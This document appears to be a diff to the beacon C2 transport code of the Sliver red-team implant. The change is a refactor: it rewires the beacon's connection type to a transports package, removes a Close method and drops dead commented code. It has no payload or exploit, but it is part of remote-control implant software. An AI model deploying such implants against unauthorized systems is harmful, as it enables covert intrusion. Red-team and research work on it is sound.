@@ -30,6 +30,7 @@ import (
 	"github.com/golang/protobuf/proto"
 
 	"github.com/bishopfox/sliver/implant/sliver/handlers"
+	"github.com/bishopfox/sliver/implant/sliver/transports"
 	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
 )
 
@@ -83,7 +84,6 @@ func (t *C2) ServeBeacon() {
 func (t *C2) HandleBeaconTasks(duration time.Duration) {
 
 	// Setup the physical connection if needed (will return without errors if not)
-	// if t.Conn == nil {
 	err := t.startTransport()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -92,10 +92,8 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 		t.FailedAttempt()
 		return
 	}
-	// }
 
 	// Setup the session connection. This is always needed
-	// if t.Connection == nil {
 	err = t.StartSession()
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -104,8 +102,8 @@ func (t *C2) HandleBeaconTasks(duration time.Duration) {
 		t.FailedAttempt()
 		return
 	}
-	// }
-	t.Beacon.connection = t.Connection // TODO: more elegant than this assignment ?
+
+	// Recreate a new, clean session layer when we use beacons.
 	defer t.Connection.Close()
 
 	// {{if .Config.Debug}}
@@ -236,13 +234,8 @@ type beacon struct {
 	interval   int64
 	jitter     int64
 	duration   time.Duration
-	connection Connection
+	connection *transports.Connection
 }
-
-// Start - Start handling a beacon-style C2 channel with its appropriate parameters
-// func (b *beacon) Start() error {
-//         panic("not implemented") // TODO: Implement
-// }
 
 // Recv - Receive a a task from the server. Blocks until one is received.
 func (b *beacon) Recv() (*pb.Envelope, error) {
@@ -264,38 +257,7 @@ func (b *beacon) Send(envelope *pb.Envelope) error {
 	return nil
 }
 
-// Close an C2 beacon channel instance. This base implementation kills the
-// underlying connection if there is one, and returns. This allows transparent
-// control over all net.Conn based transports
-// func (b *beacon) Close() error {
-//         // {{if .Config.Debug}}
-//         log.Printf("[beacon] closing ...")
-//         // {{end}}
-//         if b.connection != nil {
-//                 return b.connection.Close()
-//         }
-//         return nil
-// }
-
-func (t *C2) Close() error {
-	// {{if .Config.Debug}}
-	log.Printf("[beacon] closing ...")
-	// {{end}}
-	if t.Connection != nil {
-		return t.Connection.Close()
-	}
-	return nil
-}
-
-// Parameters
-// func (b *beacon) Interval() int64 {
-//         return b.interval
-// }
-//
-// func (b *beacon) Jitter() int64 {
-//         return b.jitter
-// }
-
+// Duration - Compute the duration needed for this transport
 func (t *C2) Duration() time.Duration {
 	p := t.Profile
 	// {{if .Config.Debug}}
@@ -311,21 +273,3 @@ func (t *C2) Duration() time.Duration {
 	// {{end}}
 	return duration
 }
-
-// func (b *beacon) Duration() time.Duration {
-//         if b == nil {
-//                 fmt.Println("NIL")
-//         }
-//         // {{if .Config.Debug}}
-//         log.Printf("Interval: %v Jitter: %v", b.Interval(), b.Jitter())
-//         // {{end}}
-//         jitterDuration := time.Duration(0)
-//         if 0 < b.Jitter() {
-//                 jitterDuration = time.Duration(int64(insecureRand.Intn(int(b.Jitter()))))
-//         }
-//         b.duration = time.Duration(b.Interval()) + jitterDuration
-//         // {{if .Config.Debug}}
-//         log.Printf("Duration: %v", b.duration)
-//         // {{end}}
-//         return b.duration
-// }
